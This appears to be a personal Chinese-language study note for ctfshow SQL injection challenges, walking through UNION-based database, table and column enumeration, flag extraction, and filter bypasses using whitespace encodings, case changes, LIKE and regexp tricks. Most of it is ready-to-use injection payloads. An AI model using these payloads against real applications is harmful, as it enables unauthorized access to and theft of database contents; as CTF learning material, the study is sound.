# sql注入学习1

<br>


### 第一步：判断注入类型

<br>

* 数字型: 使用 1 and 1=2和1 and 1=1来判断(如果没报错，那就不是数字型注入)
* 字符型： 试试可能的闭合符   '    "    ')    ")

<br>

### 第二步: 联合查询前写入语句

<br>

* 可能的闭合符   '  "  ')  ")
* 不需要的语句可以用注释符号 --+  #  %23 --%0c注释掉
* 使用group by 或者Order by 确定数据列数量:id=-2'group by 4--+
* 查找回显位:使你提交的结果能够在页面上给你体现出来 使用语句?id=-2'union select 1,2,3--+(回显的内容的数字就可以知道是哪个位置了)

<br>

### 第三步: 查询库 表 列

* 查找当前库名:?id=-2'union select 1,2,database()--+ (三号位就是苦库的名）
* 查找当前库下所有的表名:id=-2'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+(这段话用于在总表information_schema中查找database()的库所对应的table_name，也就是显示这个库中所有的表名。而group_concat则可以把这些表拼接起来) 
* 查找所有表（可能会有一堆乱七八糟的东西）：?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables--+
* 查看名为flag的表所在的库名：?id=-1' union select 1,2,table_schema from information_schema.columns where table_name="flag"--+
* 查找当前库列名:id=-2'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() --+(原理几乎同上)（另外写法：?id=-2 union select 1,group_concat(column_name),3 from information_schema.columns ctfshow --+
）
* 查找名为ctfshow的库下的flag表的列：?id=-1' union select 1,id,flag from ctfshow.flag--+
### 第四步：查询数据库
* -2'union select * from ctfshow_web.ctfshow_user where username = 'flag' --+ （在名为ctfshow_web的库里找到名为ctfshow_user的表，并且从中寻找列名username的值为flag的数据）

<br>

## 特别的绕过方式
* replace(username,'f','g'),使用改名使得flag绕过preg_match(只能对返回值过滤进行绕过)
* 空格绕过： %0a %0d %0c /**/ + `
* 换行绕过空格： %0b（用于空格绕过都不成功的情况）

<br>

### 一些更简洁的可以参考的playload
* 1'%0aunion%0asElect%0a1,2,%0agroup_concat(password)%0afrom%0actfshow_user%23
* -1'%0cor%0cusername='flag


<br>

### waf绕过
* 大小写
* 模糊搜索：在where处这样写 where pass like'%c%'(意思是在pass列中模糊搜索c开头的数据，其中的%可用%25替代)



<br>


### 基于原题下手的绕过
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
* 这段代码我们可以利用拼接来进行绕过
* 管道符-1'||username='flag
* 管道符-1'||(username)like'%fla%

### 布尔盲注：看脚本（用到where和select）


<br>

### regexp盲注：看脚本（where和select被过滤了可以用group by pass having pass regexp）

<br>

ctfshow-web184

<br>